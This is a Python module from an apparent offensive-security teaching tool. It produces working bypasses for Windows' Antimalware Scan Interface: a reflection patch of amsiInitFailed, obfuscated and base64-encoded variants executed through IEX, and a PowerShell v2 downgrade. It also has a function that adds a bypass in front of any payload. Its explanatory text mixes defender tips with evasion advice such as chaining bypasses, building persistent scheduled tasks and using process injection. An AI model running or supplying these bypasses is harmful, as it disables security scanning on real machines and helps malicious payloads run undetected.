"""
AMSI (Antimalware Scan Interface) bypass techniques for Windows
"""

import random
import string
from typing import List, Dict, Optional
from learnshells.utils.logger import Logger


class AMSIBypass:
    """AMSI bypass techniques for evading Windows Defender."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize AMSI bypass.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
    
    def get_all_bypasses(self) -> List[Dict[str, str]]:
        """
        Get all available AMSI bypass methods.
        
        Returns:
            List of bypass method dictionaries
        """
        bypasses = [
            {
                "name": "Memory Patching (AmsiInitFailed)",
                "code": self.get_memory_patch_bypass(),
                "reliability": "high",
                "detection_risk": "medium",
                "powershell_version": "3.0+"
            },
            {
                "name": "Reflection Method",
                "code": self.get_reflection_bypass(),
                "reliability": "high",
                "detection_risk": "medium",
                "powershell_version": "3.0+"
            },
            {
                "name": "Obfuscated Variable",
                "code": self.get_obfuscated_bypass(),
                "reliability": "medium",
                "detection_risk": "low",
                "powershell_version": "3.0+"
            },
            {
                "name": "Base64 Encoded",
                "code": self.get_encoded_bypass(),
                "reliability": "medium",
                "detection_risk": "low",
                "powershell_version": "3.0+"
            },
            {
                "name": "PowerShell v2 Downgrade",
                "code": self.get_downgrade_bypass(),
                "reliability": "high",
                "detection_risk": "high",
                "powershell_version": "2.0 required"
            }
        ]
        
        return bypasses
    
    def get_memory_patch_bypass(self) -> str:
        """
        Get memory patching AMSI bypass (Matt Graeber's method).
        
        Returns:
            AMSI bypass code
        """
        bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        
        return bypass
    
    def get_reflection_bypass(self) -> str:
        """
        Get reflection-based AMSI bypass.
        
        Returns:
            AMSI bypass code
        """
        bypass = """[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)"""
        
        return bypass
    
    def get_obfuscated_bypass(self) -> str:
        """
        Get obfuscated AMSI bypass using variable splitting.
        
        Returns:
            AMSI bypass code
        """
        bypass = """$a='si';$b='Am';$c='iInitFailed';$d=$b+$a+$c;[Ref].Assembly.GetType('System.Management.Automation.'+$b+$a+'Utils').GetField($d,'NonPublic,Static').SetValue($null,$true)"""
        
        return bypass
    
    def get_encoded_bypass(self) -> str:
        """
        Get base64 encoded AMSI bypass.
        
        Returns:
            AMSI bypass code
        """
        # Base64 encoded version of the memory patch
        bypass = """[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkA')) | IEX"""
        
        return bypass
    
    def get_downgrade_bypass(self) -> str:
        """
        Get PowerShell v2 downgrade bypass.
        
        Returns:
            Downgrade command
        """
        bypass = "powershell.exe -Version 2 -Command 'YOUR_PAYLOAD_HERE'"
        
        return bypass
    
    def generate_custom_bypass(
        self,
        obfuscation_level: int = 1
    ) -> str:
        """
        Generate custom obfuscated AMSI bypass.
        
        Args:
            obfuscation_level: Level of obfuscation (1-3)
            
        Returns:
            Custom obfuscated bypass
        """
        if obfuscation_level == 1:
            # Simple variable splitting
            bypass = self.get_obfuscated_bypass()
        elif obfuscation_level == 2:
            # Add random variables
            r1 = self._random_var()
            r2 = self._random_var()
            bypass = f"${r1}='Amsi';${r2}='Utils';[Ref].Assembly.GetType('System.Management.Automation.'+${r1}+${r2}).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        else:
            # Maximum obfuscation with base64
            bypass = self.get_encoded_bypass()
        
        self.logger.success(
            f"Generated AMSI bypass (obfuscation level: {obfuscation_level})",
            explain="Higher obfuscation levels are harder to detect but may be less reliable."
        )
        
        return bypass
    
    def _random_var(self, length: int = 8) -> str:
        """Generate random variable name."""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def test_bypass(self, bypass_code: str) -> str:
        """
        Generate test command for AMSI bypass.
        
        Args:
            bypass_code: AMSI bypass code
            
        Returns:
            Test command
        """
        # Test with a known malicious string
        test_cmd = f"{bypass_code}; 'amsiutils'"
        
        self.logger.info(
            "Test the bypass with this command",
            explain="If AMSI is bypassed, this should echo 'amsiutils' without being blocked."
        )
        
        return test_cmd
    
    def explain_amsi(self) -> str:
        """Explain what AMSI is and how bypasses work."""
        explanation = """
🎓 AMSI EXPLAINED:

What is AMSI?
AMSI (Antimalware Scan Interface) is a Windows security feature
introduced in Windows 10 and PowerShell 5.0+.

Purpose:
AMSI allows antivirus and security products to scan scripts,
PowerShell commands, and other code BEFORE execution.

How AMSI Works:

1. You run PowerShell command/script
2. PowerShell sends content to AMSI
3. AMSI scans content for malicious patterns
4. If malicious: Execution blocked
5. If clean: Execution allowed

┌──────────────┐
│   You Type   │
│   Command    │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  PowerShell  │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│     AMSI     │◀─── Scans for malicious content
│   Scanning   │
└──────┬───────┘
       │
   ┌───┴───┐
   │       │
   ▼       ▼
┌─────┐ ┌─────┐
│Block│ │Allow│
└─────┘ └─────┘

What AMSI Scans:
• PowerShell commands and scripts
• VBScript, JScript
• Windows Script Host
• .NET assemblies
• Office macros
• Any content via AMSI API

AMSI Bypass Techniques:

1. MEMORY PATCHING:
   [Ref].Assembly.GetType('...AmsiUtils')
      .GetField('amsiInitFailed','NonPublic,Static')
      .SetValue($null,$true)
   
   How it works:
   • Uses .NET reflection to access AMSI internals
   • Finds 'amsiInitFailed' flag
   • Sets it to true
   • PowerShell thinks AMSI initialization failed
   • Skips AMSI scanning
   
   Why it works:
   If AMSI fails to initialize, PowerShell continues
   without scanning to avoid breaking functionality.

2. OBFUSCATION:
   $a='si';$b='Am';$c='Utils'
   
   How it works:
   • Splits keywords into variables
   • Concatenates at runtime
   • Bypasses static signature detection
   • AMSI doesn't see full keyword
   
   Why it works:
   AMSI scans for known patterns. Breaking up
   patterns makes them unrecognizable.

3. ENCODING:
   Base64 encode the bypass, decode at runtime
   
   How it works:
   • Bypass code encoded as base64
   • Decoded in memory
   • Executed immediately
   • Never written as clear text
   
   Why it works:
   AMSI can't scan encoded content effectively.

4. POWERSHELL V2 DOWNGRADE:
   powershell -Version 2 -Command "..."
   
   How it works:
   • Forces PowerShell version 2
   • PowerShell 2 doesn't have AMSI
   • Scripts run without scanning
   
   Why it works:
   AMSI was added in PowerShell 5.0.
   Version 2 predates AMSI.
   
   Limitation:
   PowerShell v2 must be installed (often removed).

Detection Methods:

How Defenders Detect Bypasses:
• Behavioral analysis (accessing AmsiUtils)
• String pattern matching (known bypass code)
• Script block logging (records all scripts)
• Enhanced logging (tracks reflection usage)

Evasion Strategies:
• Use multiple techniques
• Randomize variable names
• Encode bypass code
• Chain multiple bypasses
• Use custom bypass variations

AMSI Bypass Lifecycle:

1. Bypass Discovered:
   Researcher finds new bypass technique

2. Public Release:
   Bypass shared with community

3. Detection Added:
   Microsoft/AV adds signatures

4. Bypass Obfuscated:
   Community creates variations

5. Arms Race Continues:
   Cat and mouse game

Current State (2025):
• Basic bypasses widely detected
• Obfuscated versions still work
• Custom variations most effective
• AMSI constantly improving
• New bypasses discovered regularly

Best Practices:

For Pentesting:
✓ Test bypass before real engagement
✓ Use custom variations
✓ Combine with other evasion
✓ Have backup methods ready
✓ Document what works

For Defense:
✓ Enable script block logging
✓ Monitor for AmsiUtils access
✓ Use enhanced PowerShell logging
✓ Implement application whitelisting
✓ Keep systems updated

Alternatives to Bypass:

Instead of bypassing AMSI:
• Use compiled C# assemblies
• Execute in unmanaged code
• Use direct Windows API calls
• Employ process injection
• Run in PowerShell v2 (if available)

Why AMSI Matters:

Before AMSI:
✗ Malicious scripts ran freely
✗ No runtime scanning
✗ AV only scanned files

After AMSI:
✓ Scripts scanned before execution
✓ Memory-based detection
✓ Behavioral analysis possible

Impact on Red Team:
AMSI significantly raised the bar for
PowerShell-based attacks. What worked in 2015
often fails in 2025 without proper evasion.

Remember:
AMSI is ONE layer of defense. Even with AMSI
bypassed, you may face:
• EDR (Endpoint Detection & Response)
• Application whitelisting
• Script block logging
• Network monitoring
• Behavioral analysis

Defense in depth means multiple layers.
Bypass one, face another.
"""
        return explanation
    
    def get_bypass_recommendations(self, scenario: str = "general") -> List[str]:
        """
        Get bypass recommendations for specific scenarios.
        
        Args:
            scenario: Use case scenario
            
        Returns:
            List of recommended bypasses
        """
        recommendations = {
            "general": [
                "Start with memory patching (most reliable)",
                "Have obfuscated version as backup",
                "Test before actual engagement",
                "Consider PowerShell v2 if available"
            ],
            "high_security": [
                "Use custom obfuscated bypass",
                "Combine multiple techniques",
                "Avoid known public bypasses",
                "Consider alternative execution methods"
            ],
            "quick_test": [
                "Use simple memory patch",
                "Test with 'amsiutils' string",
                "Quick and effective for testing"
            ],
            "persistent": [
                "Encode bypass in scheduled task",
                "Use obfuscation to avoid detection",
                "Monitor for AMSI updates"
            ]
        }
        
        return recommendations.get(scenario, recommendations["general"])
    
    def display_bypass_menu(self):
        """Display menu of all AMSI bypasses."""
        self.logger.header("AMSI Bypass Techniques")
        
        bypasses = self.get_all_bypasses()
        
        headers = ["Method", "Reliability", "Detection Risk", "PS Version"]
        rows = []
        
        for bypass in bypasses:
            rows.append([
                bypass["name"],
                bypass["reliability"].title(),
                bypass["detection_risk"].title(),
                bypass["powershell_version"]
            ])
        
        self.logger.table(headers, rows)
        
        self.logger.educational_note(
            "Choosing a Bypass",
            "• High reliability = Works consistently\n"
            "• Low detection risk = Harder to detect by AV\n"
            "• Consider your target environment\n"
            "• Test bypasses before engagement\n"
            "• Have multiple bypasses ready"
        )
    
    def generate_bypass_with_payload(
        self,
        payload: str,
        bypass_method: str = "memory_patch"
    ) -> str:
        """
        Generate AMSI bypass combined with payload.
        
        Args:
            payload: PowerShell payload
            bypass_method: Bypass method to use
            
        Returns:
            Combined bypass + payload
        """
        if bypass_method == "memory_patch":
            bypass = self.get_memory_patch_bypass()
        elif bypass_method == "obfuscated":
            bypass = self.get_obfuscated_bypass()
        elif bypass_method == "encoded":
            bypass = self.get_encoded_bypass()
        else:
            bypass = self.get_memory_patch_bypass()
        
        combined = f"{bypass}; {payload}"
        
        self.logger.success("Generated bypass + payload combination")
        
        return combined
